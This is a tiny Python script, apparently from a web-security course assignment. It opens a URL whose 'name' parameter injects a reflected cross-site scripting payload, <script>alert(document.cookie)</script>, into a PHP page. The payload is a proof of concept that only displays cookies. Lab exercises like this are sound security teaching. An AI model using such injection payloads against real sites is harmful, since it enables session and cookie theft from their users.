import webbrowser

url = "http://www.wsb.com/Assignment2/case02.php?name=<script>alert(document.cookie)</script>"
new = 2
webbrowser.open(url, new)